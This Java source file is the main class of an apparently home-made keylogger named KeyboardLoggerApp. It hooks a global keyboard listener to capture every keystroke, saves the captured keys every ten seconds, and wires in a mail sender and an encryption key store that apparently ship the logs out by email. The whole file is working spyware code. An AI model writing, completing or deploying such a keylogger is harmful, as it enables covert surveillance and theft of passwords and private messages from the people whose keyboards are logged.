package com.keytracker;


import com.keytracker.encrypt.KeyGen;
import com.keytracker.mail.MailSender;
import de.ksquared.system.keyboard.GlobalKeyListener;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class KeyboardLoggerApp {
    public static void main(String[] args) {
        ArgsResolver argsResolver = new ArgsResolver(args);
        MailSender mailSender = new MailSender();
        SecretKeyStore store = new SecretKeyStore(new KeyGen(), mailSender, argsResolver);  //todo te 3 klasy moze da sie zapakowac w jakas 1 i ja dac do MechanismFactoryImpl i get_() w niej

        KeyAppender keyAppender = new KeyAppender();
        MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(argsResolver, mailSender, store.secretKey());
        StoreMechanism storeMechanism = mechanismsFactory.getStoreMechanism();
        storeMechanism.registerAppender(keyAppender);

        KeyListenerImpl keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new CharactersProvider()), keyAppender);
        new GlobalKeyListener().addKeyListener(keyListener);

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(storeMechanism::store, 10, 10, TimeUnit.SECONDS);
//        shutdownHook(storeMechanism);
    }

    private static void shutdownHook(StoreMechanism fileStoreMechanism) {
        Runtime.getRuntime().addShutdownHook(new Thread(fileStoreMechanism::store, "Shutdown-thread"));
    }
}